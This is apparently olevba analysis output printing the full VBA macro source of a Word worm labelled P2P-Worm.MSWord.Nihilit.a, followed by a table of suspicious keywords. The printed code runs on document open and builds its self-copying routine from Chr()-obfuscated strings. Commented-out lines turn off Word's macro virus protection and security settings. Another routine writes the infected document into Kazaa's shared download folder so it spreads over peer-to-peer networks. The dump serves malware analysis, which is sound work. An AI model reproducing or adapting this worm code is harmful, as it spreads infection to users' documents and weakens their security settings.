olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./P2P-Worm.MSWord.Nihilit.a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./P2P-Worm.MSWord.Nihilit.a 
in file: ./P2P-Worm.MSWord.Nihilit.a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Sub autoopen()
Assistant.Visible = True
With Assistant
    .Visible = True
    Set bln = .NewBalloon
    With bln
        .Mode = msoModeAutoDown
        .Text = "D00M Riderz presents:" & vbCr & "Necronomikon's" & vbCr & "macroCommunicationEngine(NCE)"
        .Button = msoButtonSetNone
        .Show
    End With
End With
Selection.TypeText "press alt+Return for help"

CustomizationContext = ActiveDocument.AttachedTemplate
  KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyReturn), _
     KeyCategory:=wdKeyCategoryMacro, Command:="help"
     KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKey1), _
     KeyCategory:=wdKeyCategoryMacro, Command:="p2p"
     KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKey2), _
     KeyCategory:=wdKeyCategoryMacro, Command:="infect"
     KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKey3), _
     KeyCategory:=wdKeyCategoryMacro, Command:="disinfect"
End Sub

Sub help()
MsgBox "alt+2= start infection" & vbCr & "alt+3= start disinfection" & vbCr & "alt+1= start Kazaaworm" & vbCr & "alt+Return= this msgbox...", vbInformation, "NCE KeyCodes:"

End Sub
Sub infect()
Dim decrypt(18)
Zero = 0: one = 1: Falsee = False: Truee = True
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
Application.DisplayStatusBar = Falsee
'x = Application.Version: Options.VirusProtection = Zero: Options.SaveNormalPrompt = Zero
'System.PrivateProfileString("", "HKCU\Software\Microsoft\Office\" & x & "\Word\Security", "AccessVBOM") = &H1
'System.PrivateProfileString("", "HKCU\Software\Microsoft\Office\" & x & "\Word\Security", "Level") = &H1
'CommandBars("Macro").Controls("Security...").Enabled = Falsee
decrypt(1) = Chr(73) & Chr(102) & Chr(32) & Chr(84) & Chr(104) & Chr(105) & Chr(115) & Chr(68) & Chr(111) & Chr(99) & Chr(117) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(32) & Chr(61) & Chr(32) & Chr(78) & Chr(111) & Chr(114) & Chr(109) & Chr(97) & Chr(108) & Chr(84) & Chr(101) & Chr(109) & Chr(112) & Chr(108) & Chr(97) & Chr(116) & Chr(101) & Chr(32) & Chr(84) & Chr(104) & Chr(101) & Chr(110)
decrypt(2) = Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(84) & Chr(68) & Chr(32) & Chr(61) & Chr(32) & Chr(65) & Chr(99) & Chr(116) & Chr(105) & Chr(118) & Chr(101) & Chr(68) & Chr(111) & Chr(99) & Chr(117) & Chr(109) & Chr(101) & Chr(110) & Chr(116)
decrypt(3) = Chr(69) & Chr(108) & Chr(115) & Chr(101)
decrypt(4) = Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(84) & Chr(68) & Chr(32) & Chr(61) & Chr(32) & Chr(78) & Chr(111) & Chr(114) & Chr(109) & Chr(97) & Chr(108) & Chr(84) & Chr(101) & Chr(109) & Chr(112) & Chr(108) & Chr(97) & Chr(116) & Chr(101)
decrypt(5) = Chr(69) & Chr(110) & Chr(100) & Chr(32) & Chr(73) & Chr(102)
decrypt(6) = Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(97) & Chr(32) & Chr(61) & Chr(32) & Chr(84) & Chr(104) & Chr(105) & Chr(115) & Chr(68) & Chr(111) & Chr(99) & Chr(117) & Chr(109) & Chr(101) & Chr(110) & Chr(116)
decrypt(7) = Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(98) & Chr(32) & Chr(61) & Chr(32) & Chr(97) & Chr(46) & Chr(86) & Chr(66) & Chr(80) & Chr(114) & Chr(111) & Chr(106) & Chr(101) & Chr(99) & Chr(116)
decrypt(8) = Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(99) & Chr(32) & Chr(61) & Chr(32) & Chr(98) & Chr(46) & Chr(86) & Chr(66) & Chr(67) & Chr(111) & Chr(109) & Chr(112) & Chr(111) & Chr(110) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
decrypt(9) = Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(100) & Chr(32) & Chr(61) & Chr(32) & Chr(99) & Chr(46) & Chr(73) & Chr(116) & Chr(101) & Chr(109) & Chr(40) & Chr(49) & Chr(41)
decrypt(10) = Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(101) & Chr(32) & Chr(61) & Chr(32) & Chr(100) & Chr(46) & Chr(67) & Chr(111) & Chr(100) & Chr(101) & Chr(77) & Chr(111) & Chr(100) & Chr(117) & Chr(108) & Chr(101)
decrypt(11) = Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(111) & Chr(110) & Chr(101) & Chr(32) & Chr(61) & Chr(32) & Chr(101) & Chr(46) & Chr(76) & Chr(105) & Chr(110) & Chr(101) & Chr(115) & Chr(40) & Chr(49) & Chr(44) & Chr(32) & Chr(84) & Chr(104) & Chr(105) & Chr(115) & Chr(68) & Chr(111) & Chr(99) & Chr(117) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(86) & Chr(66) & Chr(80) & Chr(114) & Chr(111) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(46) & Chr(86) & Chr(66) & Chr(67) & Chr(111) & Chr(109) & Chr(112) & Chr(111) & Chr(110) & Chr(101) & Chr(110) & Chr(116) & Chr(115) & Chr(46) & Chr(73) & Chr(116) & Chr(101) & Chr(109) & Chr(40) & Chr(49) & Chr(41) & Chr(46) & Chr(67) & Chr(111) & Chr(100) & Chr(101) & Chr(77) & Chr(111) & Chr(100) & Chr(117) & Chr(108) & Chr(101) & Chr(46) & Chr(67) & Chr(111) & Chr(117) & Chr(110)
decrypt(12) = Chr(116) & Chr(79) & Chr(102) & Chr(76) & Chr(105) & Chr(110) & Chr(101) & Chr(115) & Chr(41)
Final72V$ = decrypt(11) & decrypt(12)
decrypt(13) = Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(102) & Chr(32) & Chr(61) & Chr(32) & Chr(84) & Chr(68) & Chr(58) & Chr(32) & Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(103) & Chr(32) & Chr(61) & Chr(32) & Chr(102) & Chr(46) & Chr(86) & Chr(66) & Chr(80) & Chr(114) & Chr(111) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(58) & Chr(32) & Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(104) & Chr(32) & Chr(61) & Chr(32) & Chr(103) & Chr(46) & Chr(86) & Chr(66) & Chr(67) & Chr(111) & Chr(109) & Chr(112) & Chr(111) & Chr(110) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
decrypt(14) = Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(73) & Chr(32) & Chr(61) & Chr(32) & Chr(104) & Chr(46) & Chr(73) & Chr(116) & Chr(101) & Chr(109) & Chr(40) & Chr(49) & Chr(41) & Chr(58) & Chr(32) & Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(116) & Chr(119) & Chr(111) & Chr(32) & Chr(61) & Chr(32) & Chr(73) & Chr(46) & Chr(67) & Chr(111) & Chr(100) & Chr(101) & Chr(77) & Chr(111) & Chr(100) & Chr(117) & Chr(108) & Chr(101)
decrypt(15) = Chr(116) & Chr(119) & Chr(111) & Chr(46) & Chr(68) & Chr(101) & Chr(108) & Chr(101) & Chr(116) & Chr(101) & Chr(76) & Chr(105) & Chr(110) & Chr(101) & Chr(115) & Chr(32) & Chr(49) & Chr(44) & Chr(32) & Chr(116) & Chr(119) & Chr(111) & Chr(46) & Chr(67) & Chr(111) & Chr(117) & Chr(110) & Chr(116) & Chr(79) & Chr(102) & Chr(76) & Chr(105) & Chr(110) & Chr(101) & Chr(115)
decrypt(16) = Chr(116) & Chr(119) & Chr(111) & Chr(46) & Chr(65) & Chr(100) & Chr(100) & Chr(70) & Chr(114) & Chr(111) & Chr(109) & Chr(83) & Chr(116) & Chr(114) & Chr(105) & Chr(110) & Chr(103) & Chr(32) & Chr(111) & Chr(110) & Chr(101)
decrypt(17) = Chr(73) & Chr(102) & Chr(32) & Chr(84) & Chr(68) & Chr(32) & Chr(61) & Chr(32) & Chr(65) & Chr(99) & Chr(116) & Chr(105) & Chr(118) & Chr(101) & Chr(68) & Chr(111) & Chr(99) & Chr(117) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(32) & Chr(84) & Chr(104) & Chr(101) & Chr(110) & Chr(32) & Chr(65) & Chr(99) & Chr(116) & Chr(105) & Chr(118) & Chr(101) & Chr(68) & Chr(111) & Chr(99) & Chr(117) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(83) & Chr(97) & Chr(118) & Chr(101) & Chr(65) & Chr(115) & Chr(32) & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(78) & Chr(97) & Chr(109) & Chr(101) & Chr(58) & Chr(61) & Chr(65) & Chr(99) & Chr(116) & Chr(105) & Chr(118) & Chr(101) & Chr(68) & Chr(111) & Chr(99) & Chr(117) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(70) & Chr(117) & Chr(108) & Chr(108) & Chr(78)
decrypt(18) = Chr(97) & Chr(109) & Chr(101)
Final05R$ = decrypt(17) & decrypt(18)
'If ThisDocument = NormalTemplate Then
'Set TD = ActiveDocument
'Else
'Set TD = NormalTemplate
'End If
'Set a = ThisDocument: Set b = a.VBProject: Set c = b.VBComponents: Set d = c.Item(1)
'Set e = d.CodeModule
'Set one = e.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
'Set f = TD: Set g = f.VBProject: Set h = g.VBComponents
'Set I = h.Item(1): Set two = I.CodeModule
'two.DeleteLines 1, two.CountOfLines
'two.AddFromString one
'If TD = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub disinfect()
 On Error Resume Next
Zero = 0: one = 1: Falsee = False: Truee = True
Application.DisplayStatusBar = Truee
Options.VirusProtection = one
Options.SaveNormalPrompt = one
CommandBars("Macro").Controls("Security...").Enabled = Truee
    Clean = NormalTemplate.VBProject.VBComponents.Item(one).CodeModule.CountOfLines
    If Clean > 0 Then NormalTemplate.VBProject.VBComponents.Item(one).CodeModule.DeleteLines one, Clean
    NormalTemplate.Save
    Call ExitSettings
End Sub
Sub ExitSettings() ' Ensures An Error Is Not Thrown Up At Exit
    On Error Resume Next
    NormalTemplate.Saved = True
    ActiveDocument.Saved = True
End Sub
Sub p2p()
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Kazaa\Transfer", "DlDir0") <> "" Then
MkDir fso.GetSpecialFolder(2) & "\downloadz"
If (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=fso.GetSpecialFolder(2) & "\downloadz\" & ActiveDocument.Name
ActiveDocument.Saved = True
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Kazaa\Transfer", "DlDir1") = fso.GetSpecialFolder(2) & "\downloadz"
End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

